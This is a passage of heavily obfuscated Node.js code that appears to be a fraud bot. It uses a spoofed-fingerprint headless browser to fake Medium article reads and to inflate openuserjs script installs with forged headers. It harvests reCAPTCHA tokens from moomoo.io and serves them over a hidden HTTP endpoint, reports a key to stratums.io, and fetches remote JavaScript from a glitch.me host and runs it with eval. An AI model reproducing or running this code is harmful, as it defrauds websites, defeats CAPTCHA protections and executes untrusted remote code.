      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + T(0xa) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': U(0x0) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + U(0x12) + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1e9 * 0x12 + 0x170d + -0x3 * -0x3c7
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const W = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xa4 * 0x3 + -0x91d + 0xb09)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1119 + -0x26f1 + 0x386e), doFlags[W(0x9, '*J)C')] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x262e * 0x1 + -0x3 * 0x435 + -0x192b), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x43 * 0x69 + -0x1328 * -0x1 + -0x2ea3;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xfa3 * 0x1 + -0x23f + 0x11e2; w < getRandomInt(-0xd * 0x1df + 0xe03 * 0x1 + 0xa51, 0x3db + 0x3 * -0x96c + 0x186e); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x13ffe + -0x4fb + -0x50a3);
        }
      }();
    }, -0x2ea + 0xfe1 + 0x1 * -0xc93), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2 * -0x473 + -0x987 + -0x35 * -0x59;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x14a7 * -0x1 + -0x1f * -0xee + 0x5 * -0x9e5, 0x3 * -0xc46 + 0x106b + 0x1499)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const X = c;
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': X(0xe)
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x788e + -0x4a * 0x18d + 0x6f64);
    }, -0x1dc * -0x9 + -0x6a * -0x5e + 0x2 * -0x1ba2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1a64 + 0x1d55 + -0x37b9;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x32 + 0x1 * -0x123 + 0xca9), await u['evaluate'](() => {
            const Y = d;
            let v = new XMLHttpRequest();
            v[Y(0x10)]('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x11 * 0x14b + -0x8d3 + -0x1ece * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xa7d9d + -0x8d8cd + 0x21120a);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x38a * 0x5 + -0x1 * -0x1cf3 + -0x1 * 0x2e41);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Z = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x184c + -0x14a * -0x1 + -0x18ce);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + Z(0x3, 'dgm]') + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x12e7 + 0x1 * -0x14b + 0xa * 0x52d);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x2d * 0x17 + -0x1 * -0x175d + -0x1b67) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x89f * 0x2 + 0x2316 + -0x3453));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1ecb + -0x61c + 0x3 * 0xc4d, D['indexOf']('\x20'));
        return B ? E['slice'](0x1694 + -0x13d9 * 0x1 + -0x2bb, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * 0x1a3f + 0x3db9 + -0x11 * -0x36),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xdf * 0x7 + -0x8 * -0x1e6 + 0x1 * 0x1df9),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + a0(0x11, 'Fzxj') + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
